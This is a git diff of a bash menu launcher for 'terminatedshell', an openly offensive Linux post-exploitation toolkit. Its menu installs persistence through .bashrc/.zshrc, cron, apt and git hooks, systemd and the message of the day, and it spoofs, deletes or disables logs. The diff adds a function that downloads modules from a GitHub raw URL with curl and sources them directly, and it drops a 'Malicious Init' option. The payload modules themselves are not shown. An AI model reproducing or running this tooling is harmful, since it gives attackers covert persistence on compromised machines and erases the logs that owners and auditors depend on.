@@ -23,6 +23,15 @@ line(){
      printf -- '────────%.0s' \ {1..5}
 }
 
+if command -v rlwrap &> /dev/null; then
+    if [ -z "$RLWRAP" ]; then
+        RLWRAP=1 exec rlwrap "$0" "$@"
+    fi
+else
+    echo "${RED}rlwrap${EOC} is not installed. Command history will not work."
+fi
+
+
 text_banner="
  ${RED}     .--.${EOC}
  ${RED}    |x x |   ╔╦╗${EOC}${BOLD}┌─┐┬─┐┌┬┐┬┌┐┌┌─┐┌┬┐┌─┐┌┬┐${EOC}${RED}╔═╗${EOC}${BOLD}┬ ┬┌─┐┬  ┬  ${EOC}
@@ -33,13 +42,13 @@ text_banner="
  ${RED} \___)=(___/${EOC} "
 
 options="
-\t\t${RED}[ - MAIN FUNCTIONS - ]${EOC}
+\t\t${RED}[ - FUNCTIONS - ]${EOC}
 \t${RED}$(line)${EOC}
 \t${RED}[1]${EOC} ${BOLD}- Manage Users [view|add|delete]                      ${EOC}
 \t$(line)
 \t${RED}[2]${EOC} ${BOLD}- Shell Config [.bashrc|.zshrc]                       ${EOC}
 \t$(line)
-\t${RED}[3]${EOC} ${BOLD}- Scheduler [job|task]                                ${EOC}
+\t${RED}[3]${EOC} ${BOLD}- Cron [job]                                          ${EOC}
 \t$(line)
 \t${RED}[4]${EOC} ${BOLD}- Hooks [apt-get|git]                                 ${EOC}
 \t$(line)
@@ -47,12 +56,10 @@ options="
 \t$(line)
 \t${RED}[6]${EOC} ${BOLD}- Message of the Day                                  ${EOC}
 \t$(line)
-\t${RED}[7]${EOC} ${BOLD}- Malicious Init                                      ${EOC}
-\t$(line)
-\t${RED}[8]${EOC} ${BOLD}- Log [spoof|delete|disable]                        ${EOC}
+\t${RED}[7]${EOC} ${BOLD}- Log [spoof|delete|disable]                          ${EOC}
 \t${RED}$(line)${EOC}
 
-\t\t${RED}[ - OTHER FUNCTIONS - ]${EOC}
+\t\t${RED}[ - COMMANDS - ]${EOC}
 \t${RED}$(line)${EOC}
 \t${RED}[ cls | clear ]${EOC} -${BOLD} Clear terminal                          ${EOC}
 \t$(line)
@@ -83,39 +90,57 @@ else
 fi;
 }
 
-# --- Export vars for child functions ---
+# --- Export vars for child proccesses ---
 export LC_ALL current_shell random priv_status BOLD RED ALERT EOC
+
+
+download_func(){
+    local f_name
+    local f_file=functions/$f_name;
+    if [[ ! -f "$f_file" ]]; then
+        echo -e "${RED}[!]${EOC} Function ${BOLD}$f_file${EOC} not found locally. Downloading..."
+        if ! curl -fsSL "https://raw.githubusercontent.com/anonimidin/terminatedshell/main/functions/$f_name" -o "$f_file"; 
+        then
+            echo -e "${RED}[x]${EOC} Failed to download ${BOLD}$f_file${EOC}."
+            return 0
+        else
+            echo -e "${RED}[+]${EOC} ${BOLD}$f_file${EOC} download successfuly."
+        fi
+    fi;
+    return 0
+}
+
 
 # --- User management [ View | Add | Delete ] --- 
 manage_users() {
-    if . functions/MANAGE_USERS; then
+    if download_func "MANAGE_USERS" && . functions/MANAGE_USERS; then
         echo -e "\n${RED}[+]${EOC} ${BOLD}User management${EOC} function finished ${RED}SUCCESSFULLY${EOC}\n" && menu
     else
         echo -e "\n${RED}[x]${EOC} ${BOLD}User management${EOC} function finished ${RED}UNSUCCESSFULLY${EOC}\n" && menu
     fi;
-} 
+}
 
-# --- Shell Configuration Persistence File [ bash | zshrc ]  ---
+# --- Shell Configuration Persistence File [ bash | zshrc ] ---
 shell_func(){
-    if . functions/SHELL; then
+    if download_func "SHELL" && . functions/SHELL; then
         echo -e "\n${RED}[+]${EOC} ${BOLD}Shell${EOC} function finished ${RED}SUCCESSFULLY${EOC}\n" && menu
     else
         echo -e "\n${RED}[x]${EOC} ${BOLD}Shell${EOC} function finished ${RED}UNSUCCESSFULLY${EOC}\n" && menu
     fi;
 }
 
-# --- Scheduler Persistance [ at | cron ]---
-sched_func(){
-    if . functions/SCHEDULER; then
-        echo -e "\n${RED}[+]${EOC} ${BOLD}Scheduler${EOC} function finished ${RED}SUCCESSFULLY${EOC}\n" && menu
+# --- Cron Persistance ---
+cron_func(){
+    if download_func "CRON" && . functions/CRON; then
+        echo -e "\n${RED}[+]${EOC} ${BOLD}Cron${EOC} function finished ${RED}SUCCESSFULLY${EOC}\n" && menu
     else
-        echo -e "\n${RED}[x]${EOC} ${BOLD}Scheduler${EOC} function finished ${RED}UNSUCCESSFULLY${EOC}\n" && menu
+        echo -e "\n${RED}[x]${EOC} ${BOLD}Cron${EOC} function finished ${RED}UNSUCCESSFULLY${EOC}\n" && menu
     fi;
 }
 
 # --- Hooks presistance [ Apt pre-invoke and Git pre-commit ] ---
 hooks_func(){
-    if . functions/HOOKS; then
+    if download_func "HOOKS" && . functions/HOOKS; then
         echo -e "\n${RED}[+]${EOC} ${BOLD}Hooks${EOC} function finished ${RED}SUCCESSFULLY${EOC}\n" && menu
     else
         echo -e "\n${RED}[x]${EOC} ${BOLD}Hooks${EOC} function finished ${RED}UNSUCCESSFULLY${EOC}\n" && menu
@@ -124,7 +149,7 @@ hooks_func(){
 
 # --- Systemd persistence [ User/SU level]---
 systemd_func(){
-    if . functions/SYSTEMD; then
+    if download_func "SYSTEMD" && . functions/SYSTEMD; then
         echo -e "\n${RED}[+]${EOC} ${BOLD}Systemd${EOC} function finished ${RED}SUCCESSFULLY${EOC}\n" && menu
     else
         echo -e "\n${RED}[x]${EOC} ${BOLD}Systemd${EOC} function finished ${RED}UNSUCCESSFULLY${EOC}\n" && menu
@@ -134,7 +159,7 @@ systemd_func(){
 # --- MOTD persistence ---  
 motd_func(){
 if [[ $priv_status == "is_su" ]]; then
-    if . functions/MOTD; then
+    if download_func "MOTD" && . functions/MOTD; then
         echo -e "\n${RED}[+]${EOC} ${BOLD}MOTD${EOC} function finished ${RED}SUCCESSFULLY${EOC}\n" && menu
     else
         echo -e "\n${RED}[x]${EOC} ${BOLD}MOTD${EOC} function finished ${RED}UNSUCCESSFULLY${EOC}\n" && menu
@@ -144,22 +169,9 @@ else
 fi
 }
 
-# --- Malicious init persistence ---
-malint_func(){
-if [[ "$priv_status" == "is_su" ]]; then
-    if . functions/MALINT; then
-        echo -e "\n${RED}[+]${EOC} ${BOLD}MALINT${EOC} function finished ${RED}SUCCESSFULLY${EOC}\n" && menu
-    else
-        echo -e "\n${RED}[x]${EOC} ${BOLD}MALINT${EOC} function finished ${RED}UNSUCCESSFULLY${EOC}\n" menu
-    fi
-else
-    echo -e "${RED}[x]${EOC} U need SU privileges to add malicious init\n" && menu
-    fi
-}
-
 # --- Logs [ spoof | delete & disable ] ---
 logs_func(){
-    if . functions/LOGS; then
+    if download_func "LOGS" && . functions/LOGS; then
         echo -e "\n${RED}[+]${EOC} ${BOLD}LOGS${EOC} function finished ${RED}SUCCESSFULLY${EOC}\n" && menu
     else
         echo -e "\n${RED}[x]${EOC} ${BOLD}LOGS${EOC} function finished ${RED}UNSUCCESSFULLY${EOC}\n" && menu
@@ -189,26 +201,19 @@ menu(){
 read -rp $'\033[0;91m[*] [TERMINATED_SHELL] >\e[0m ' choice
     # --- Wait for choice from user ---
     case $choice in
-    
+     
     1) sleep 0.5 && echo && manage_users;;
     2) sleep 0.5 && echo && shell_func;;
-    3) sleep 0.5 && echo && sched_func;;
+    3) sleep 0.5 && echo && cron_func;;
     4) sleep 0.5 && echo && hooks_func;;
     5) sleep 0.5 && echo && systemd_func;;
     6) sleep 0.5 && echo && motd_func;;
-    7) sleep 0.5 && echo && malint_func;;
-    8) sleep 0.5 && echo && logs_func;;
-    # 10) sleep 0.5 && echo && ;;
+    7) sleep 0.5 && echo && logs_func;;
+    # 10) sleep 0.5 && echo && new_func ;;
 
     0 | [Qq] | [Qq][Uu][Ii][Tt] | [Ee][Xx][Ii][Tt]) # --- About repo & exit ---
-        if command -v open > /dev/null; then 
-            echo -e "\n${RED}[!]${EOC} ${RED}Help us to improve & spread this script${EOC}\n" && \
-            sleep 1.5 && open https://github.com/anonimidin/terminatedshell &> /dev/null;
-            echo "${RED}[*]${EOC} Redicated to ${RED}project github page${EOC}" || { echo -e "${RED}[x]${EOC} Failed to open github project in your ${RED}default browser${EOC}"; }
-        else
-            sleep 0.5
-            echo -e "${RED}[!]${EOC} ${RED}Help us to improve & spread this script (https://github.com/anonimidin/terminatedshell)${EOC}\n"
-        fi;;
+        sleep 0.5
+        echo -e "${RED}[!]${EOC} ${RED}Help us to improve this script (https://github.com/anonimidin/terminatedshell)${EOC}\n" ;;
 
     "?" | [Hh] | [Hh][Ee][Ll][Pp]) # --- Show option based menu ---
         sleep 0.5 && echo -e "$options" && menu;;
